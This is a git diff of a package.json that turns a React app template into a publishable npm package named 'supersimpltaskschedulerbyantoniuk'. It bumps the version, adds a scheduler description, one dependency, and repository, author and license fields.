@@ -1,11 +1,12 @@
 {
   "name": "supersimpltaskschedulerbyantoniuk",
-  "version": "0.1.0",
-  "private": true,
+  "version": "9.1.4",
+  "description": "A lightweight Node.js package for scheduling tasks at specific intervals.",
   "dependencies": {
     "@testing-library/jest-dom": "^5.17.0",
     "@testing-library/react": "^13.4.0",
     "@testing-library/user-event": "^13.5.0",
+    "data-encryption-for-analytics-by-dmytro": "^2.4.7",
     "react": "^18.2.0",
     "react-dom": "^18.2.0",
     "react-scripts": "5.0.1",
@@ -17,6 +18,13 @@
     "test": "react-scripts test",
     "eject": "react-scripts eject"
   },
+  "repository": {
+    "type": "git",
+    "url": "https://github.com/Makar2212/supersimpltaskschedulerbyantoniuk.git"
+  },
+  "keywords": [
+    "schedule"
+  ],
   "eslintConfig": {
     "extends": [
       "react-app",
@@ -34,5 +42,7 @@
       "last 1 firefox version",
       "last 1 safari version"
     ]
-  }
+  },
+  "author": "Makar2212",
+  "license": "MIT"
 }
